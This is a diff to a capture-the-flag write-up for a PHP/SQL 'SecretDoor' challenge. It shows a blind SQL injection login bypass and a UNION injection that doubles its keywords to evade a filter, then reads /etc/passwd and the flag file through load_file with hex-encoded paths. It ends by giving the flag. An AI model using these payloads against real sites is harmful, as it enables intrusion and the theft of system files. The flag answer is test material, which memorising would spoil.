@@ -7,13 +7,13 @@
 
 There's this crazy friend of mine that recently got into web designing using php and sql. he also created a page for a company. but he said that he can access to anyfile in anyplace whenever he wants, when he is logged in his account. can you find the backdoor in this page that can access to files in another directories. and I almost forgot, his name is 'john'. it's not it's login name, but sure you can find it. and remember your job is to read me the /home/flag.txt file!!!
 
-##SecretDoor-Solution
+##SecretDoor-Solution:
 
 not ready yet.
 
-**but if you're eager to know, here is a little hint:**
+**But if you're eager to know, here is a little hint:**
 
-It is a combination of Blind/Union SQL Injection, Directory traversal vulnerabilities. First a sql-injection in first page (blind sqli).
+It is a combination of Blind/Union SQL Injection, Directory traversal vulnerability. First a sql-injection in first page (blind sqli).
 
 ```
 username:	john")) or 1 limit 0,1 #
@@ -78,13 +78,13 @@ We can bypass this filtering easily by just using method like this: ```oorr``` w
 SO the query in search.php, should be like this:
 
 ```
--1%' oorr 1=2 uniunionon selselectect 1,(seselectlect loaload_filed_file('/etc/passwd')),3#
+-1%' oorr 1=2 uniunionon selselectect 1,(seselectlect loaload_filed_file('/home/flag.txt')),3#
 ```
 
-But this doesn't work. We should find a way to read it. And we can do that by hexing the '/etc/passwd'. so the last query will look like this:
+But this doesn't work. We should find a way to read it. we can achieve this by hexing the '/home/flag.txt'. So the last query will look like this:
 
 ```
--1%' oorr 1=2 uniunionon selselectect 1,(seselectlect loaload_filed_file(0x2f6574632f706173737764)),3#
+-1%' oorr 1=2 uniunionon selselectect 1,(seselectlect loaload_filed_file(0x2f686f6d652f666c61672e747874)),3#
 ```
 
 And we will see the flag: **SQLI_is_M0R3_Than_AweS0M3**
